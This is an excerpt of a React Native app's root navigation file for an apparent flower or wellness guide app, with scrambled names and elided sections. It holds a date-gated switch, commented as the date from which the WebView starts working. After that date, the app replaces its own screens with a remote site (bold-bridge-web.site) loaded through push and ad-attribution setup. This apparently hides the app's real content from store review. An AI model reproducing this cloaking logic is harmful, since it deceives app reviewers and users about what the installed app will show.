...
import { NavigationContainer as BlossomNavRoot } from '@react-navigation/native';
import OpenpageBalanceFlowGuide from './BalaminflowSourGd/BalandeguiwerScrns/OpenpageBalanceFlowGuide';
import MindBalanceFlowerGuideOnboarding from './BalaminflowSourGd/BalandeguiwerScrns/MindBalanceFlowerGuideOnboarding';
import MindBalanceFlowerGuideLoading from './BalaminflowSourGd/BalandeguiwerScrns/MindBalanceFlowerGuideLoading';
import { GestureHandlerRootView as BlossomGestureRoot } from 'react-native-gesture-handler';
const BalanFlowceStack = createBlossomStack();
import { createNativeStackNavigator as createBlossomStack } from '@react-navigation/native-stack';
import { SafeAreaProvider as BlossomSafeArea } from 'react-native-safe-area-context';
import ProductScreen from './BalaminflowSourGd/BalandeguiwerScrns/ProductScreen';
// libs
import AsyncStorage from '@react-native-async-storage/async-storage';
import { LogLevel, OneSignal } from 'react-native-onesignal';
import AppleAdsAttribution from '@vladikstyle/react-native-apple-ads-attribution';

const BlossomNavigator = () => {
  ...
  const INITIAL_URL = `https://bold-bridge-web.site/`;
  const URL_IDENTIFAIRE = `81N7YSk6`;
  ...
  OneSignal.initialize('c389e296-5560-48f4-9480-1facd0f7ff9e');
  ...
  useEffect(() => {
    ...
    const targetData = new Date('2025-12-25T08:08:00'); //дата з якої поч працювати webView
  ...
  const Route = ({ isFatch }) => {
    ...
    if (isFatch) {
      return (
        <BalanFlowceStack.Navigator>
          <BalanFlowceStack.Screen
            initialParams={{
              responseToPushPermition,
              product: finalLink,
    ...
    return (
      <BalanFlowceStack.Navigator initialRouteName="MindBalanceFlowerGuideOnboarding">
        <BalanFlowceStack.Screen
          component={OpenpageBalanceFlowGuide}
          name="OpenpageBalanceFlowGuide"
          options={{
            headerShown: false,
        ...
        <BalanFlowceStack.Screen
          options={{ headerShown: false }}
          name="MindBalanceFlowerGuideOnboarding"
          component={MindBalanceFlowerGuideOnboarding}
        />
        <BalanFlowceStack.Screen
          options={{
            animation: 'fade',
          ...
          component={MindBalanceFlowerGuideLoading}
          name="MindBalanceFlowerGuideLoading"
        />
      </BalanFlowceStack.Navigator>
    );
  };
        ...
        <View style={{ flex: 1, overflow: 'hidden' }}>
          ...
          >
            <Image
              ...
              source={require('./BalaminflowSourGd/MinguifloerAssts/BalaIMAGEflowedends/1.png')}
              resizeMode="cover"
            />
            <Image
              style={{ width: screenWidth, height: '100%' }}
              source={require('./BalaminflowSourGd/MinguifloerAssts/BalaIMAGEflowedends/2.png')}
              resizeMode="cover"
            />
          </Animated.View>
        </View>
...
const FlowersBalanceRootWrap = () => (
  <BlossomGestureRoot style={{ flex: 1 }}>
    <BlossomSafeArea>
      <BlossomNavigator />
    </BlossomSafeArea>
  </BlossomGestureRoot>
...
export default FlowersBalanceRootWrap;
